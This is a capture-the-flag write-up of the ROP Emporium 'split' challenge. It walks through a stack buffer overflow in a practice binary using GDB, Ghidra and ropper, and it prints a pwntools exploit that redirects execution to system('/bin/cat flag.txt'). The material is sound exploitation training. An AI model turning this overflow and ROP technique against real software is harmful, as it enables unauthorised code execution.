### Binary Exploitation

### Source: ROP Emporium

### Name: Split (x86 & x64)

### Basic File Checks

```
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/split/32bit]
└─$ file split 
split: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/split/32bit]
└─$ checksec split
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/RopEmperium/split/32bit/split'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We're working with a x86 binary and the protections enabled is just NX

I'll run the binary to get an overview of what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/split/32bit]
└─$ ./split
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> lol
Thank you!

Exiting
```

So it prints out some words then asks for input then exits after we give it input

Decompiling using ghidra i’ll read the main function

```

undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("split by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

So the main function calls the pwnme() function

Here’s the decompiled pwnme function

```

void pwnme(void)

{
  undefined input [40];
  
  memset(input,0,0x20);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,input,0x60);
  puts("Thank you!");
  return;
}
```

So reading the code we get the vulnerability that is in it, it reads 0x60 bytes of data into a 40 bytes input buffer

With this we have 16 extra bytes which will cause an overflow

Looking through the code i get another function called `usefulFunction`

```

void usefulFunction(void)

{
  system("/bin/ls");
  return;
}
```

We see it runs system `ls` which will list files in the current working directory

But we want to get the content of the flag.txt (might nt be named flag.txt on remote server 👀)

But for now lets abuse the buffer overflow and return to the usefulFunction function lool

I'll get the offset the way i did it in [Ret2Win](https://markuched13.github.io/posts/bof/ret2win.html) 

```
└─$ gdb -q split  
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from split...
(No debugging symbols found in split)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
gef➤  disass pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:     push   ebp
   0x080485ae <+1>:     mov    ebp,esp
   0x080485b0 <+3>:     sub    esp,0x28
   0x080485b3 <+6>:     sub    esp,0x4
   0x080485b6 <+9>:     push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x80486d4
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048700
   0x080485de <+49>:    call   0x80483c0 <printf@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0x4
   0x080485e9 <+60>:    push   0x60
   0x080485eb <+62>:    lea    eax,[ebp-0x28]
   0x080485ee <+65>:    push   eax
   0x080485ef <+66>:    push   0x0
   0x080485f1 <+68>:    call   0x80483b0 <read@plt>
   0x080485f6 <+73>:    add    esp,0x10
   0x080485f9 <+76>:    sub    esp,0xc
   0x080485fc <+79>:    push   0x8048703
   0x08048601 <+84>:    call   0x80483d0 <puts@plt>
   0x08048606 <+89>:    add    esp,0x10
   0x08048609 <+92>:    nop
   0x0804860a <+93>:    leave  
   0x0804860b <+94>:    ret    
End of assembler dump.
gef➤  b *pwnme+93
Breakpoint 1 at 0x804860a
gef➤  r
Starting program: /home/mark/Desktop/BofLearn/Challs/RopEmperium/split/32bit/split 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> pwnerhacker
Thank you!

Breakpoint 1, 0x0804860a in pwnme ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xf7e1e9b8  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcfa0  →  "pwnerhacker\n"
$ebp   : 0xffffcfc8  →  0xffffcfd8  →  0x00000000
$esi   : 0x8048630  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804860a  →  <pwnme+93> leave 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfa0│+0x0000: "pwnerhacker\n"      ← $esp
0xffffcfa4│+0x0004: "rhacker\n"
0xffffcfa8│+0x0008: "ker\n"
0xffffcfac│+0x000c: 0x00000000
0xffffcfb0│+0x0010: 0x00000000
0xffffcfb4│+0x0014: 0x00000000
0xffffcfb8│+0x0018: 0x00000000
0xffffcfbc│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048601 <pwnme+84>       call   0x80483d0 <puts@plt>
    0x8048606 <pwnme+89>       add    esp, 0x10
    0x8048609 <pwnme+92>       nop    
 →  0x804860a <pwnme+93>       leave  
    0x804860b <pwnme+94>       ret    
    0x804860c <usefulFunction+0> push   ebp
    0x804860d <usefulFunction+1> mov    ebp, esp
    0x804860f <usefulFunction+3> sub    esp, 0x8
    0x8048612 <usefulFunction+6> sub    esp, 0xc
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped 0x804860a in pwnme (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804860a → pwnme()
[#1] 0x8048590 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcfa0 - 0xffffcfad  →   "pwnerhacker\n" 
gef➤  i f
Stack level 0, frame at 0xffffcfd0:
 eip = 0x804860a in pwnme; saved eip = 0x8048590
 called by frame at 0xffffcff0
 Arglist at 0xffffcfc8, args: 
 Locals at 0xffffcfc8, Previous frame's sp is 0xffffcfd0
 Saved registers:
  ebp at 0xffffcfc8, eip at 0xffffcfcc
gef➤ 
```

Doing the math i get the offset ` 0xffffcfcc - 0xffffcfa0 = 0x2c` 

The offset is `44` now here's the exploit to make the eip return to the usefulFunction function 

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './split'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
offset = 44

# Start program
io = start()

padding = "A" * offset 
usefulFunction = 0x0804860c

# Build the payload
payload = flat([
    padding,
    usefulFunction
])

# Send the payload
io.sendlineafter(b'>', payload)

io.interactive()
```

On running it we get that there's flag.txt 

```
└─$ python2 exploit.py                                
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './split': pid 141866
[*] Switching to interactive mode
 Thank you!
exploit.py  flag.txt  split
[*] Got EOF while reading in interactive
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 141866)
[*] Got EOF while sending in interactive
```

So i searched for string in ghidra and found that there's a `/bin/cat flag.txt` function in it
![image](https://user-images.githubusercontent.com/113513376/217665814-71e9af11-d769-482a-b5a7-9e7c82ed3c56.png)
![image](https://user-images.githubusercontent.com/113513376/217665880-909368a1-4b14-48cb-aeb8-860f873668ed.png)

```
                             usefulString                                    XREF[1]:     Entry Point(*)  
        0804a030 2f 62 69        ds         "/bin/cat flag.txt"
                 6e 2f 63 
                 61 74 20 
```

Cool we have a function we can return to but now we can't directly just call `/bin/cat flag.txt` because the program won't be able to understand it since it isn't a command function in C

But instead we can call `system` then call `/bin/cat flag.txt` 

We can directly put this on the stack since this is x86 binary

So i'll look for the `system` address
![image](https://user-images.githubusercontent.com/113513376/217666750-a8d36048-15af-473e-893a-326933564b71.png)

```
        0804861a e8 c1 fd        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
```

Now with this, here's the exploit [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/split/exploit32.py)

Running it we get the flag

```
└─$ python3 exploit.py 
[+] Starting local process './split': pid 113943
[+] ROPE{a_placeholder_32byte_flag!}
[*] Stopped process './split' (pid 113943)
```

But the way to solve the x64 binary is different 

Firstly i'll get the required parameters

```
1. Offset
2. /bin/cat address
3. system adress
4. pop_rdi gadget
```

So i just followed the same way used in the x86 to get the offset, and addresses

But as for the pop_rdi address, i'll use ropper to get it

Why i use pop_rdi is to pass the /bin/cat as an argument to system since we can't directly put it in the stack and expect it to execute

```
└─$ ropper --file split --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 
```

Now here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ropemporium/split/exploit64.py)

And we're done 

<br> <br>
[Back To Home](../../index.md)

